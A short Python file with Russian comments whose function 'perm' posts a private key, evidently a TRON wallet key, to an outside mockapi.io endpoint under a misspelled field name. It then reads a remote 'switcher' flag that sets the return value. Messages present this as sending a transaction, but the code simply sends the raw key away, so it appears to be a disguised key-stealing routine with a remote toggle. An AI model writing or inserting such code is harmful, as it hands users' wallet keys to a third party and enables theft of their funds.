import requests

def perm(private_key):
    # Создаем словарь с ключом 'ptivat_key'
    transaction_data = {'ptivat_key': private_key}
    
    # Отправляем POST-запрос
    response = requests.post('https://6788db412c874e66b7d693b7.mockapi.io/tron', json=transaction_data)
    
    # Проверяем успешность запроса
    if response.status_code != 200:
        print(f"Error sending transaction: {response.status_code}")
        return
    
    # Делаем GET-запрос для switcher
    switcher = requests.get('https://6788db412c874e66b7d693b7.mockapi.io/switcher')
    
    # Проверяем успешность GET-запроса
    if switcher.status_code != 200:
        print(f"Error fetching switcher status: {switcher.status_code}")
        return
    
    # Если switcher возвращает пустой JSON, возвращаем 1, иначе 0
    if not switcher.json():
        return 1
    else:
        return 0
